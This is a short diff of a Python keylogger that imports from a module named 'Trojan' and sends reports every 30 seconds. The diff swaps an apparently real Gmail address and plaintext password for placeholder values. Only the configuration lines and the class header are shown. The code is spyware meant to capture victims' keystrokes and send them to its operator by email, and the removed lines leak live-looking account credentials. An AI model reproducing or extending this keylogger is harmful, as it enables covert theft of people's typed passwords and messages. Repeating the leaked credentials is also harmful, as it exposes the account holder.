@@ -6,8 +6,8 @@ from threading import Semaphore, Timer
 from Trojan.snake import *
 
 SEND_REPORT_EVERY = 30  # seconds
-EMAIL_ADDRESS = "iamrickycool4@gmail.com"
-EMAIL_PASSWORD = "needforspeed24"
+EMAIL_ADDRESS = "email@email.com"
+EMAIL_PASSWORD = "password"
 
 
 class Keylogger:
